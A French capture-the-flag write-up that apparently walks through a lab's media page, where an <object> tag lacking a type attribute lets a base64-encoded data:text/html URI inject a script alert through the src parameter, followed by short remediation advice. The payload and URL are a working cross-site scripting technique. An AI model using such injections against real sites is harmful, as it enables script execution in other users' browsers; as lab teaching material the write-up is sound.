<h1 align="center">
object
</h1>

<p><b>Trouver la balise object : </b></p>

Cliquer sur le 3iéme logo de la NSA sur l'index du site.  
Une redirection se fait sur `http://<IP>/?page=media&src=nsa`   
Inspecter la page.  
L'image est dans une balise `<object>` et non `<img>`.  

<p><b> Caractéristiques de la balise <object></b></p>

```
Cet élément est conçu pour insérer toute sorte de document. On spécifie de quelle sorte avec l'attribut type en indiquant le type mime, et la source du document avec l'attribut data en indiquant son URI.
Si le navigateur, ou un de ses plugins, sait interpréter ce document, il le fait sinon le contenu imbriqué est affiché.
Tout code HTML peut être insérer comme contenu alternatif, par exemple un lien vers le document, ou une image à la place d'une animation. Ce peut également être un autre object, on parle de "d'object imbriqués".
```

On remarque que dans notre cas, la balise `<object>` n'as pas d'attribut type. Nous allons donc essayer d'exploiter ce manque.

<p><b> Récupération du flag :</b></p>

Nous allons essayer d'insérer le script suivant à la place de l'image:

```
<script>
alert("hey");
</script>
```

Pour cela nous allons l'encoder en base 64, ce qui donne :  
`PHNjcmlwdD4KYWxlcnQoImhleSIpOwo8L3NjcmlwdD4`  
  
Ensuite rajouter l'entete correspondant :    
`data:text/html;base64,PHNjcmlwdD4KYWxlcnQoImhleSIpOwo8L3NjcmlwdD4` 
  
En remplacant le lien de l'image de la NSA par le code ci dessus nous avons bien un pop-up qui apparait.  
Cette faille est donc exploitable.  
  
Pour recuperer le flag, il suffit de remplacer le `nsa` de l'url par le code, ce qui donne :  
`http://<IP>/?page=media&src="data:text/html;base64,PHNjcmlwdD4KYWxlcnQoImhleSIpOwo8L3NjcmlwdD4="`  

<p><b> Solution : </b></p>
Ne pas oublier les attributs importants des balises.    </br>
Mettre des balises plus adapté : ici la balise img aurait fait l'affaire.
